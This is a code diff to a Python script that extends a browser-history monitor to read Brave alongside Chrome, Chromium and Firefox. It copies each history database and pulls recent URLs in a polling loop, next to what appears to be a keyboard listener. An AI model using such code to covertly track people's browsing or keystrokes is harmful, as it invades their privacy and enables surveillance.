@@ -16,6 +16,7 @@ seen_urls = set()
 # Paths for browser history
 CHROME_HISTORY_PATH = os.path.expanduser('~/.config/google-chrome/Default/History')
 CHROMIUM_HISTORY_PATH = os.path.expanduser('~/.config/chromium/Default/History')
+BRAVE_HISTORY_PATH = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser/Default/History')
 FIREFOX_PROFILE_DIR = os.path.expanduser('~/.mozilla/firefox')
 
 
@@ -44,12 +45,12 @@ def on_release(key):
         print("[INFO] Escape key released, exiting listener.")
         return False
 
-def get_chrome_history(path):
+def get_chrome_history(path, browser_name="Chrome/Chromium/Brave"):
     urls = []
     if os.path.exists(path):
-        print(f"[BROWSER] Found Chrome/Chromium history at: {path}")
-        # Copy the file to avoid lock issues
-        tmp_path = '/tmp/chrome_history_copy'
+        print(f"[BROWSER] Found {browser_name} history at: {path}")
+        # Use a unique tmp_path for each browser to avoid conflicts
+        tmp_path = f'/tmp/{browser_name.lower().replace("/", "_")}_history_copy'
         try:
             shutil.copy2(path, tmp_path)
             print(f"[BROWSER] Copied history DB to: {tmp_path}")
@@ -58,13 +59,13 @@ def get_chrome_history(path):
             cursor.execute('SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20')
             for url, _ in cursor.fetchall():
                 urls.append(url)
-            print(f"[BROWSER] Retrieved {len(urls)} Chrome/Chromium URLs.")
+            print(f"[BROWSER] Retrieved {len(urls)} {browser_name} URLs.")
             conn.close()
             os.remove(tmp_path)
         except Exception as e:
-            print(f"[ERROR] Failed to get Chrome/Chromium history: {e}")
+            print(f"[ERROR] Failed to get {browser_name} history: {e}")
     else:
-        print(f"[BROWSER] Chrome/Chromium history not found at: {path}")
+        print(f"[BROWSER] {browser_name} history not found at: {path}")
     return urls
 
 def get_firefox_history():
@@ -99,12 +100,14 @@ def browser_history_monitor():
     print("[INFO] Browser history monitor started.")
     while True:
         urls = set()
-        # Chrome/Chromium
-        chrome_urls = get_chrome_history(CHROME_HISTORY_PATH)
-        chromium_urls = get_chrome_history(CHROMIUM_HISTORY_PATH)
+        # Chrome/Chromium/Brave
+        chrome_urls = get_chrome_history(CHROME_HISTORY_PATH, "Chrome")
+        chromium_urls = get_chrome_history(CHROMIUM_HISTORY_PATH, "Chromium")
+        brave_urls = get_chrome_history(BRAVE_HISTORY_PATH, "Brave")
         firefox_urls = get_firefox_history()
         urls.update(chrome_urls)
         urls.update(chromium_urls)
+        urls.update(brave_urls)
         urls.update(firefox_urls)
         new_urls = urls - seen_urls
         print(f"[INFO] Found {len(new_urls)} new browser URLs.")
